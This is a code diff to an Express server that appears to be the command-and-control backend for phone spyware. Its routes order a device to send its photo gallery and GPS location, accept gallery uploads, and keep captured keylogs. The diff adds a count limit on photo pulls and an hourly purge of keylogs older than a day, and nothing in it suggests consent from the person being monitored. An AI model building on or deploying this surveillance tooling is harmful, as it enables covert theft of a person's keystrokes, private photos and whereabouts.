@@ -27,6 +27,7 @@ app.use(
   })
 );
 
+// ================= DATABASE SETUP =================
 async function setupDatabase() {
   try {
     await pool.query(`
@@ -67,6 +68,7 @@ function requireLogin(req, res, next) {
   next();
 }
 
+// ================= AUTH =================
 app.post("/api/signup", async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -232,22 +234,27 @@ app.get("/api/ui", requireLogin, async (req, res) => {
 
 // ================= GALLERY =================
 app.post("/api/gallery/request", requireLogin, async (req, res) => {
-  const { deviceId } = req.body;
+  const { deviceId, count } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
   if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
     return res.status(403).json({ error: "Not your device." });
   }
-  galleryRequestFlags.set(deviceId, true);
-  res.json({ success: true });
+  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 100) : 100;
+  galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
+  res.json({ success: true, count: safeCount });
 });
 
 app.get("/api/gallery/request", async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const requested = galleryRequestFlags.get(deviceId) || false;
-  if (requested) galleryRequestFlags.delete(deviceId);
-  res.json({ requested });
+  const flag = galleryRequestFlags.get(deviceId);
+  if (flag) {
+    galleryRequestFlags.delete(deviceId);
+    res.json({ requested: true, count: flag.count });
+  } else {
+    res.json({ requested: false, count: 100 });
+  }
 });
 
 app.post("/api/gallery/upload", async (req, res) => {
@@ -299,6 +306,16 @@ app.get("/api/gps/request", async (req, res) => {
   if (requested) gpsRequestFlags.delete(deviceId);
   res.json({ requested });
 });
+
+// ================= KEYLOG CLEANUP (24 HOURS) =================
+setInterval(() => {
+  const cutoff = Date.now() - 24 * 60 * 60 * 1000;
+  for (let i = keylogs.length - 1; i >= 0; i--) {
+    if ((keylogs[i].timestamp || 0) < cutoff) {
+      keylogs.splice(i, 1);
+    }
+  }
+}, 60 * 60 * 1000); // প্রতি ১ ঘণ্টা পর পর
 
 // ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
